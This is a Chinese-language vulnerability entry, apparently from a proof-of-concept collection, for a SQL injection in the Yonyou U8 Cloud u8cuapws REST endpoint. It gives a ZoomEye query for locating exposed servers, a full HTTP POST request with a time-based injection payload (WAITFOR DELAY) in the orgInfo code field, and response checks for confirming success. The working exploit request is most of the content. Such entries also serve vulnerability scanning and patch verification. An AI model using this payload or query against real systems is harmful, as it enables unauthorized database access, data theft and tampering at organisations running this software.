﻿# 用友U8 Cloud U8cuapws SQL注入漏洞

> 更新时间：2024-03-01

> 漏洞编号：

> 漏洞说明：U8 Cloud U8cuapws接口处存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

> 漏洞特征：ZoomEye语法 app:"用友U8 Cloud"

> 验证脚本：HTTP

```
POST /u8cuapws/rest/archive/verify HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=2CF686311039E0648824AB1DDE0D956B.server
If-None-Match: W/"1120-1637735266000"
If-Modified-Since: Wed, 24 Nov 2021 06:27:46 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded

{"orgInfo":{"code":"1';WAITFOR DELAY '0:0:5'--"}}
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?code)(?=.*?success).*?$

> 上传文件定位：

> 验证文件来源：用友U8 Cloud U8cuapws SQL注入漏洞.poc

